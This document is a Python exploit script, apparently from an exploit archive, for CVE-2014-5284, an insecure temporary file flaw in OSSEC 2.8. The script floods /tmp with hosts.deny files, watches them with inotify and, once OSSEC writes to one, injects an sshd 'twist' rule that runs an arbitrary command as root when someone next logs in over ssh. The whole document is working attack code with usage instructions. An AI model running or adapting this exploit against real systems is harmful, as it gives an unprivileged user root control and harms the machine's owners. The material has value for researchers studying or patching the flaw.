#!/usr/bin/python
# Exploit Title: ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation
# Date: 14-11-14
# Exploit Author: skynet-13
# Vendor Homepage: www.ossec.net/
# Software Link: https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gz
# Version: OSSEC  - 2.8
# Tested on: Ubunutu x86_64
# CVE : 2014-5284

# Created from Research by
# Jeff Petersen
# Roka Security LLC
# jpetersen@rokasecurity.com
# Original info at https://github.com/ossec/ossec-hids/releases/tag/2.8.1

# Run this on target machine and follow instructions to execute command as root

from twisted.internet import inotify
from twisted.python import filepath
from twisted.internet import reactor
import os
import optparse
import signal


class HostDenyExploiter(object):

    def __init__(self, path_to_watch, cmd):
        self.path = path_to_watch
        self.notifier = inotify.INotify()
        self.exploit = cmd

    def create_files(self):
        print "=============================================="
        print "Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ..."

        for i in range(300, 65536):
            filename = "/tmp/hosts.deny.%s" % i
            f = open(filename, 'w')
            f.write("")
            f.close()

    def watch_files(self):
        print "=============================================="
        print "Monitoring tmp for file change...."
        print "ssh into the system a few times with an incorrect password"
        print "Then wait for up to 10 mins"
        print "=============================================="
        self.notifier.startReading()
        self.notifier.watch(filepath.FilePath(self.path), callbacks=[self.on_file_change])

    def write_exploit_to_file(self, path):
        print 'Writing exploit to this file'
        f = open(str(path).split("'")[1], 'w')
        f.write(' sshd : ALL : twist %s \n' % self.exploit)
        f.close()
        print "=============================================="
        print " ssh in again to execute the command"
        print "=============================================="
        print "               End Prog."
        os.kill(os.getpid(), signal.SIGUSR1)

    def on_file_change(self, watch, path, mask):
        print 'File: ', str(path).split("'")[1], ' has just been modified'
        self.notifier.stopReading()
        self.write_exploit_to_file(path)


if __name__ == '__main__':
    parser = optparse.OptionParser("usage of program \n" + "-c Command to run as root in quotes\n")
    parser.add_option('-c', dest='cmd', type='string', help='Used to specify a command to run as root')
    (options, args) = parser.parse_args()
    cmd = options.cmd
    if options.cmd is None:
        print parser.usage
        exit(0)
    ex = HostDenyExploiter('/tmp', cmd)
    ex.create_files()
    ex.watch_files()
    reactor.run()
    exit(0)